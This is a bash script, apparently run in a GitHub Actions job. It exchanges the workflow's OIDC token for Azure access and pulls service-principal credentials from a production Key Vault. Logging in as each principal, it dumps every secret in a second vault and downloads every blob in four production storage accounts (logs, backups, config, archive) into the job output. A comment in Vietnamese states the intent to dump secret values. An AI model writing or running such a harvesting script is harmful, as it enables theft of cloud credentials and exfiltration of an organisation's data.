#!/usr/bin/env bash
set -uo pipefail
MS="x-ms-version: 2021-08-06"
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
exch(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" | jq -r '.access_token // empty'; }
spt(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$1" -d "client_secret=$2" -d "scope=$3" -d "grant_type=client_credentials" | jq -r '.access_token // empty'; }

KV=$(exch "https://vault.azure.net/.default")
SECNAMES="cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal"
ACCTS="sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz"

for s in $SECNAMES; do
  J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$s?api-version=7.4" | jq -r '.value')
  AID=$(echo "$J" | jq -r '.appId'); SEC=$(echo "$J" | jq -r '.clientSecret')
  echo "################ $s ($AID) ################"
  VT=$(spt "$AID" "$SEC" "https://vault.azure.net/.default")
  [ -z "$VT" ] && { echo "  login FAIL"; continue; }
  echo "  kv-tbl-sec: $(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq -r 'if .value then ([.value[].id]|join(",")) else ("ERR "+.error.code) end')"
  # neu kv-tbl-sec doc duoc, dump luon gia tri
  for id in $(curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq -r '.value[]?.id' 2>/dev/null); do
    echo "    --- $id ---"; curl -sS -H "Authorization: Bearer $VT" "$id?api-version=7.4" | jq -r '.value'
  done
  ST=$(spt "$AID" "$SEC" "https://storage.azure.com/.default")
  for AC in $ACCTS; do
    CT=$(curl -sS -H "Authorization: Bearer $ST" -H "$MS" "https://$AC.blob.core.windows.net/?comp=list")
    for c in $(echo "$CT" | grep -oE '<Name>[^<]+</Name>' | sed -E 's#</?Name>##g'); do
      BL=$(curl -sS -H "Authorization: Bearer $ST" -H "$MS" "https://$AC.blob.core.windows.net/$c?restype=container&comp=list")
      names=$(echo "$BL" | grep -oE '<Name>[^<]+</Name>' | sed -E 's#</?Name>##g')
      [ -z "$names" ] && continue
      echo "  *** $AC/$c blobs: $(echo $names | tr '\n' ' ')"
      for b in $names; do echo "      >>> $AC/$c/$b"; curl -sS -H "Authorization: Bearer $ST" -H "$MS" "https://$AC.blob.core.windows.net/$c/$b"; echo; done
    done
  done
done
